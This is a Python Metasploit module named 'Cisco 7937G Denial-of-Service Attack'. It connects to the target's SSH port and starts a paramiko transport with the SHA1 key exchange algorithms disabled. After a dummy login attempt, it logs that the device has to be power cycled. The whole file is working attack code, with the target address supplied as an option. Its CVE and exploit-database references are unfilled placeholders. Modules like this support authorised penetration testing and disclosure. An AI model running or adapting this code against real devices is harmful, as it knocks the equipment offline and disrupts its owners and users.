#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging

# extra modules
dependency1_missing = False
dependency2_missing = False
try:
    import socket
except ImportError:
    dependency1_missing = True
try:
    import paramiko
except ImportError:
    dependency2_missing = True

from metasploit import module


metadata = {
    'name': 'Cisco 7937G Denial-of-Service Attack',
    'description': '''
        DoS Attack
    ''',
    'authors': [
        'Cody Martin'
    ],
    'date': '2020-06-02',
    'license': 'GPL_LICENSE',
    'references': [
        {'type': 'url', 'ref': '<url>'},
        {'type': 'cve', 'ref': '2020-#'},
        {'type': 'edb', 'ref': '#'}
    ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': ''},
        'timeout': {'type': 'int', 'description': 'Timeout in seconds', 'required': True, 'default': 15}
    }
}


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependency1_missing:
        logging.error('Module dependency (socket) is missing, cannot continue')
        return
    if dependency2_missing:
        logging.error('Module dependency (paramiko) is missing, cannot continue')
        return

    # Exploit
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(int(args['timeout']))
    try:
        sock.connect((args['rhost'], 22))
    except OSError:
        logging.error("Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.")
        return

    transport = paramiko.Transport(sock=sock, disabled_algorithms={"kex": ["diffie-hellman-group-exchange-sha1",
                                                                           "diffie-hellman-group14-sha1",
                                                                           "diffie-hellman-group1-sha1"]})

    try:
        transport.connect(username="notreal", password="notreal")
    except (paramiko.ssh_exception.SSHException, OSError, paramiko.SSHException):
        logging.info("DoS non-reset attack completed!")
        logging.info("Errors are intended.")
        logging.info("Device must be power cycled to restore functionality.")
        return

    return


if __name__ == '__main__':
    module.run(metadata, run)